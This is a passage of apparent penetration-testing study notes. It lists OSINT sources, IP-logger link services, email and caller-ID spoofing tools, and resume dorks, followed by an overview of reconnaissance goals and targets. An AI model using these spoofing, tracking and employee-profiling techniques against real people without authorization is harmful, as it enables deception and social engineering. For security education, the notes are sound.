IP of users by sending a custom tracking URL.\n*   [https://grabify.link](https://grabify.link) \n*   [https://iplogger.org](https://iplogger.org) \n\n***\n### 19. ✉️ Email Tracking and Spoofing\n***\n#### 🔍 Email Header Analysis\nTrace sender, IP, location.\n\n#### 📮 DMARC, SPF, DKIM Lookup\n*   **Tools:**\n    *   [https://easydmarc.com/tools/dmarc-lookup](https://easydmarc.com/tools/dmarc-lookup) \n    *   ```bash\n        dig TXT _dmarc.example.com\n        ```\n\n#### 🕵️ Spoofing Emails\n*   **Tools:**\n    *   [https://emkei.cz/](https://emkei.cz/) \n    *   [https://anonymailer.net/](https://anonymailer.net/) \n\n***\n### 20. 📞 Call Spoofing\n***\nMake calls with fake caller ID (for social engineering).\n*   **Tools:**\n    *   Mobile apps like TextMe, SpoofCard\n    *   **Web:** [http://www.crazycall.net](http://www.crazycall.net) \n\n***\n### 21. 📚 Newsgroup Searches\n***\nLook for legacy discussions, leaks, or company messages.\n*   [https://groups.google.com](https://groups.google.com) \n*   Yahoo Groups (archived)\n\n***\n### 22. 💼 Online Job Listings\n***\nScrape info on tech stack, tools, locations, departments.\n*   LinkedIn Jobs\n*   Indeed, Glassdoor\n*   Careers page of target\n\n***\n### 23. 📄 Resumes\n***\nLook for tech usage, internal tools, emails, and infrastructure clues.\n*   **Search:**\n    ```\n    site:linkedin.com/in \"company name\"\n    filetype:pdf resume \"company name\"\n    ```\n\n***\n### 24. 🛠️ Tech Support Forums\n***\nLook for employees leaking details in questions or discussions.\n*   [https://stackoverflow.com](https://stackoverflow.com) \n*   [https://quora.com](https://quora.com) \n*   [https://glassdoor.com](https://glassdoor.com) \n\n***\n### 25. 📝 Blogs and Community Forums\n***\nFind articles and discussions authored by employees.\n*   Medium\n*   Reddit (subreddits like r/netsec, r/sysadmin)\n*   Blogger, WordPress\n\n***\n### 26. 📱 Social Media Profiling\n***\nAnalyze company and employee activity across platforms.\n*   [https://tweetdeck.twitter.com](https://tweetdeck.twitter.com) \n*   [https://hootsuite.com](https://hootsuite.com) \n*   [https://www.social-searcher.com](https://www.social-searcher.com) \n\n***\n### 27. 🔔 Google Alerts\n***\nMonitor mentions of target in real time.\n*   [https://www.google.com/alerts](https://www.google.com/alerts) \n\n---\n---"}, {"name": "reconnaissance", "content": "# Reconnaissance (Footprinting)\n\nReconnaissance is the initial phase of a penetration test or cyberattack, where the attacker gathers as much information as possible about the target system or organization. This phase is crucial as it helps to plan the subsequent stages of an attack or penetration test.\n\n---\n## Types of Reconnaissance\n\n### Passive Reconnaissance\n\nCollecting information without directly interacting with the target.\n\n**Examples:**\n- Searching public records\n- Examining social media\n- Using tools like WHOIS, DNS queries, or public websites (e.g., job boards, company websites)\n\n### Active Reconnaissance\n\nInvolves direct interaction with the target to gather information.\n\n**Examples:**\n- Scanning ports and services using tools like Nmap\n- Sending phishing emails to gather credentials\n- Probing web applications for vulnerabilities\n\n---\n\n## Goals of Reconnaissance\n\n- Identify potential entry points\n- Understand the target's network structure\n- Collect details about users, roles, and infrastructure\n- Determine possible vulnerabilities\n\n---\n\n## Key Areas of Focus\n\n### 1. Network Vulnerabilities\n\n- **Open Ports**: Unnecessary or unsecured ports exposing services\n- **Misconfigured Devices**: Routers, firewalls, and switches with weak/default configurations\n- **Weak Network Protocols**: Use of outdated protocols (e.g., Telnet, FTP, SMBv1)\n- **Unauthorized Access**: Systems that allow connections without proper authentication\n\n### 2. Web Application Vulnerabilities\n\nCommon issues (OWASP Top 10):\n\n- **Injection Attacks**: SQL, NoSQL, Command, and LDAP injection\n- **Broken Authentication**: Weak or missing authentication mechanisms\n- **Cross-Site Scripting (XSS)**: Malicious scripts in web pages\n- **Cross-Site Request Forgery (CSRF)**: Forcing users to perform actions unknowingly\n- **Insecure Deserialization**: Exploiting serialized data to execute arbitrary code\n\n### 3. System and Server Vulnerabilities\n\n- **Unpatched Software**: Missing security updates\n- **Default Credentials**: Factory-set usernames and passwords\n- **Privilege Escalation**: Gaining higher privileges via misconfigurations or vulnerabilities\n- **Insecure File Permissions**: Sensitive files accessible to unauthorized users\n\n### 4. Authentication and Authorization Issues\n\n- **Weak Password Policies**: Easily guessable or reused passwords\n- **Brute Force and Dictionary Attacks**: Attempting to crack credentials\n- **Misconfigured MFA**: Weak or missing multi-factor authentication\n\n### 5. Data Exposure\n\n- **Sensitive Information in Code/Logs**: Credentials, API keys, or PII in source code, error messages, or logs\n- **Data Leaks**: Exposed databases, cloud storage, or backups\n- **Improper Data Encryption**: Use of outdated or weak encryption\n\n### 6. Social Engineering Weaknesses\n\n- **Phishing Susceptibility**: Employees falling for fake emails or websites\n- **Pretexting**: Impersonation to gain sensitive information\n- **Physical Security Gaps**: Unsecured physical access to systems or sensitive areas\n\n### 7. Wireless Network Vulnerabilities\n\n- **Insecure Wi-Fi Configurations**: Open or weakly encrypted wireless networks\n- **Rogue Access Points**: Unauthorized devices mimicking legitimate networks\n- **Man-in-the-Middle (MITM) Attacks**: Intercepting communication between devices\n\n### 8. Cloud Security Issues\n\n- **Misconfigured Storage Buckets**: Publicly accessible (e.g., S3 buckets)\n- **Exposed APIs**: APIs lacking authentication or rate limiting\n- **IAM Misconfigurations**: Overly permissive roles or exposed credentials\n\n### 9. IoT and Embedded System Weaknesses\n\n- **Hardcoded Credentials**: Fixed credentials in devices\n- **Insecure Firmware**: Firmware vulnerabilities\n- **Lack of Updates**: Devices not receiving regular security patches\n\n---\n\n## Organization Information\n\n- **Organization Website**: Public-facing resource with general/technical information\n- **Company Directory**: Lists employees, roles, and contact details\n- **Employee Details**: Profiles from LinkedIn, social media, or public platforms\n- **Location Details**: Physical addresses and office locations\n- **Addresses/Phone Numbers**: Valuable for pretexting or phone-based phishing\n- **Comments in HTML Source Code**: Developer notes or references\n  - Example: `<!-- TODO: Remove this link before going live -->`\n- **Security Policies Deployed**: Public policies or notices showing security posture\n- **Web Server Links**: External APIs or third-party services linked to the website\n- **Background of Organization**: Company's history and structure\n- **News/Press Releases**: Recent changes, expansions, or acquisitions\n\n## Network Information\n\n- **Domain Names**: Identifies organization's internet presence  \n  Example: `example.com`, `sub.example.com`\n- **Internal Domains**: Insights into internal naming conventions  \n  Example: `internal.local`, `intranet.example.com`\n- **IP Addresses**: Public and private IP ranges\n- **Unmonitored/Private Websites**: Internal applications not publicly indexed\n- **TCP/UDP Services**: Services running on specific ports  \n  Example: HTTP (port 80), SSH (port 22)\n- **VPN/IDS/IPS/Access Controls**: Secure access and network protection mechanisms\n- **VPN Information**: Configuration details or vulnerabilities in VPN solutions\n- **Phone Numbers/VoIP**: Communication systems for potential social engineering\n\n---\n\n## Operating System Information\n\n- **User & Group Names/Info**: Usernames and group memberships\n- **Banner Grabbing**: Captures banners to identify software/versions\n- **Routing Tables**: Network routes and interfaces\n- **SNMP (Simple Network Management Protocol)**: Device and network details\n- **System Architecture**: 32-bit, 64-bit, or other platform details\n- **Remote Systems**: Connected or shared systems\n- **System Names**: Naming conventions indicating roles  \n  Example: `DC01` (Domain Controller), `SQLServer`\n- **Passwords**: Credentials from exposed services, brute force, or social engineering\n\n---\n\n## External Reconnaissance\n\n- **Network**: Public-facing IPs and domains\n- **Phone**: Public or leaked phone numbers\n- **Website**: Analyze forms, scripts, and structure\n- **Source Code**: Public repositories (e.g., GitHub) containing sensitive information\n- **Website Mirroring**: Create offline copies using tools like `wget` or `HTTrack`\n- **Archive Sites**: Historical snapshots (e.g., Archive.org, CachedView)\n- **GitHub Recon**: Tools like Gitrob, truffleHog to search repositories and commits\n- **Whois**: Domain registration details and admin contacts\n- **Web Server Content**: Backup files, configuration files, or sensitive data\n- **Email Header**: Metadata showing IPs, server paths, and infrastructure\n- **Google/Search Engines**: Google Dorking for sensitive data or internal links\n- **Google Hacking**: Advanced queries (`filetype:`, `site:`, `inurl:`)\n- **People Sites**: People search engines (e.g., Pipl, BeenVerified)\n- **Social Networks**: Data from LinkedIn, Twitter, Facebook, etc.\n- **Job Sites**: Job postings revealing tech stacks or internal tools\n- **Alert Website**: Monitoring changes (e.g., Google Alerts)\n\n---\n\n## Internal Reconnaissance\n\n- **IP Addresses**: Internal network mapping and critical systems\n- **Internal DNS**: Internal domain records and zone transfers\n- **Private Websites**: Intranet and other internal web apps\n- **Dumpster Diving**: Searching for sensitive information in discarded items  \n  Examples: Printed documents, sticky notes, old hardware
